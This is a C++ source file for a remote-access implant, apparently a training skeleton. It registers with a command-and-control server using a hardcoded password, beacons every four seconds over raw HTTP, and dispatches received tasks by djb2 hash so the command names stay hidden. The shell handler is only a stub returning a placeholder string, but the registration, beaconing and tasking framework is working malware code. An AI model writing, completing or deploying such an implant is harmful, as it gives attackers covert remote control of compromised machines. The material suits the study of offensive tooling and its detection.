#include "config.h"
#include "debug.h"
#include "json.hpp"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

using json = nlohmann::json;

// djb2 hash function (using 64-bit arithmetic)
static unsigned long long djb2(const char *str) {
  unsigned long long hash = 5381;
  int c;
  while ((c = *str++))
    hash = ((hash << 5) + hash) + (unsigned long long)c;
  return hash;
}

// Precomputed hash for "shell"
#define CMD_SHELL_HASH 210727781757ULL

// Helper: Append data to a dynamically allocated buffer using realloc.
static int append_buffer(char **buffer, size_t *buf_size, size_t *used,
                         const char *data, size_t data_len) {
  if (*used + data_len >= *buf_size) {
    size_t new_size = (*buf_size) * 2;
    while (*used + data_len >= new_size)
      new_size *= 2;
    char *temp = (char *)realloc(*buffer, new_size);
    if (!temp)
      return -1;
    *buffer = temp;
    *buf_size = new_size;
  }
  memcpy(*buffer + *used, data, data_len);
  *used += data_len;
  return 0;
}

// round_trip builds an HTTP request and returns the full response (headers and
// body) using dynamic buffers. Caller is responsible for freeing the returned
// pointer.
char *round_trip(const char *host, const char *port, const char *path,
                 const json &body) {
  // Convert json body to a string (allowed temporary use of std::string)
  std::string body_str = body.dump();
  size_t body_len = body_str.size();

  // Build the HTTP request using snprintf to calculate the required length.
  const char *http_format = "POST %s HTTP/1.1\r\n"
                            "Host: %s\r\n"
                            "User-Agent: ch0nky\r\n"
                            "Connection: keep-alive\r\n"
                            "Content-Length: %zu\r\n"
                            "Content-Type: application/json\r\n\r\n"
                            "%s";
  int req_len =
      snprintf(NULL, 0, http_format, path, host, body_len, body_str.c_str());
  if (req_len < 0) {
    DEBUG_LOG("snprintf error while calculating request length\n");
    return NULL;
  }
  char *req_buffer = (char *)malloc(req_len + 1);
  if (!req_buffer) {
    DEBUG_LOG("malloc failed for req_buffer\n");
    return NULL;
  }
  snprintf(req_buffer, req_len + 1, http_format, path, host, body_len,
           body_str.c_str());
  DEBUG_LOG("HTTP Request:\n%s\n", req_buffer);

  // Setup connection (IPv4)
  int sock_fd = -1;
  struct addrinfo hints, *res, *p;
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  int status = getaddrinfo(host, port, &hints, &res);
  if (status != 0) {
    DEBUG_LOG("Failed to resolve %s:%s\n", host, port);
    free(req_buffer);
    return NULL;
  }
  for (p = res; p != NULL; p = p->ai_next) {
    sock_fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
    if (sock_fd == -1) {
      perror("socket");
      continue;
    }
    if (connect(sock_fd, p->ai_addr, p->ai_addrlen) == -1) {
      perror("connect");
      close(sock_fd);
      sock_fd = -1;
      continue;
    }
    break;
  }
  freeaddrinfo(res);
  if (sock_fd == -1) {
    DEBUG_LOG("Failed to connect to server\n");
    free(req_buffer);
    return NULL;
  }

  // Send the full request.
  size_t total_sent = 0;
  while (total_sent < (size_t)req_len) {
    ssize_t sent =
        send(sock_fd, req_buffer + total_sent, req_len - total_sent, 0);
    if (sent <= 0) {
      perror("send");
      free(req_buffer);
      close(sock_fd);
      return NULL;
    }
    total_sent += sent;
  }
  free(req_buffer);

  // Read response into a dynamic buffer using realloc.
  size_t buf_size = 4096;
  size_t used = 0;
  char *response = (char *)malloc(buf_size);
  if (!response) {
    DEBUG_LOG("malloc failed for response\n");
    close(sock_fd);
    return NULL;
  }
  ssize_t recvd;
  char recv_buf[4096];
  while ((recvd = recv(sock_fd, recv_buf, sizeof(recv_buf), 0)) > 0) {
    if (append_buffer(&response, &buf_size, &used, recv_buf, recvd) != 0) {
      DEBUG_LOG("realloc failed during response reading\n");
      free(response);
      close(sock_fd);
      return NULL;
    }
  }
  if (recvd < 0) {
    perror("recv");
    free(response);
    close(sock_fd);
    return NULL;
  }
  close(sock_fd);
  // Null-terminate the response.
  if (append_buffer(&response, &buf_size, &used, "\0", 1) != 0) {
    DEBUG_LOG("Failed to null-terminate response\n");
    free(response);
    return NULL;
  }
  DEBUG_LOG("HTTP Response:\n%s\n", response);

  // Check for header-body separator.
  char *header_end = strstr(response, "\r\n\r\n");
  if (!header_end) {
    DEBUG_LOG("Invalid HTTP response: missing header/body separator\n");
    free(response);
    return NULL;
  }
  // Validate that header contains JSON content.
  if (strstr(response, "Content-Type: application/json") == NULL) {
    DEBUG_LOG("Unexpected Content-Type in response header\n");
    free(response);
    return NULL;
  }
  // Caller can locate the body using strstr(response, "\r\n\r\n")
  return response;
}

// Dummy shell command; returns a JSON object.
json fake_shell() {
  json result;
  result["result"] = "i am so stealthy";
  return result;
}

// handle_task dispatches based on command hash (using djb2) and a switch-case.
int handle_task(const json &chk_data, json &out) {
  if (chk_data.is_null()) {
    DEBUG_LOG("chk_data is null; no task to do\n");
    return -1;
  }
  std::string cmd = chk_data.value("cmd", "");
  if (cmd.length() == 0) {
    DEBUG_LOG("No command specified in task\n");
    return -1;
  }
  unsigned long long cmd_hash = djb2(cmd.c_str());
  switch (cmd_hash) {
  case CMD_SHELL_HASH:
    out["id"] = chk_data.value("id", 0);
    out["result"] = fake_shell();
    out["status"] = "ok";
    DEBUG_LOG("Executed shell command. Output: %s\n", out.dump().c_str());
    return 0;
  default:
    DEBUG_LOG("Unknown command: %s\n", cmd);
    return -2;
  }
}

int main() {
  DEBUG_LOG("Starting implant...\n");
  json req_body;
  req_body["password"] = "we_<3_ghost";

  char *resp = round_trip(C2_HOST, C2_PORT, REGISTER_URI, req_body);
  if (!resp) {
    DEBUG_LOG("Registration failed\n");
    return 1;
  }
  // Locate the body in the response by finding the header separator.
  char *body_start = strstr(resp, "\r\n\r\n");
  if (!body_start) {
    DEBUG_LOG("Malformed HTTP response\n");
    free(resp);
    return 1;
  }
  body_start += 4; // Skip over "\r\n\r\n"
  json reg_data = json::parse(body_start);
  size_t session_id = reg_data.value("id", 0);
#ifdef DEBUG
  session_id = 1;
  DEBUG_LOG("Warning: hardcoded session id\n");
#endif
  DEBUG_LOG("Registration data: %s, id: %lu\n", reg_data.dump().c_str(),
            session_id);

  // Build checkin URI dynamically using snprintf.
  char checkin_uri[256];
  snprintf(checkin_uri, sizeof(checkin_uri), "%s/%lu", CHECKIN_URI, session_id);

  json task_out = json::object();
  while (1) {
    sleep(4);
    DEBUG_LOG("Sending task output: %s\n", task_out.dump().c_str());
    char *chck_resp = round_trip(C2_HOST, C2_PORT, checkin_uri, task_out);
    if (!chck_resp) {
      DEBUG_LOG("Failed to get task response\n");
      continue;
    }
    char *chk_body = strstr(chck_resp, "\r\n\r\n");
    if (!chk_body) {
      DEBUG_LOG("Malformed HTTP response during checkin\n");
      free(chck_resp);
      continue;
    }
    chk_body += 4;
    json checkin_resp_data = json::parse(chk_body);
    task_out.clear();
    int status = handle_task(checkin_resp_data, task_out);
    if (status < 0) {
      DEBUG_LOG("Task handling error\n");
    }
    free(chck_resp);
  }
  DEBUG_LOG("Implant shutting down...\n");
  return 0;
}
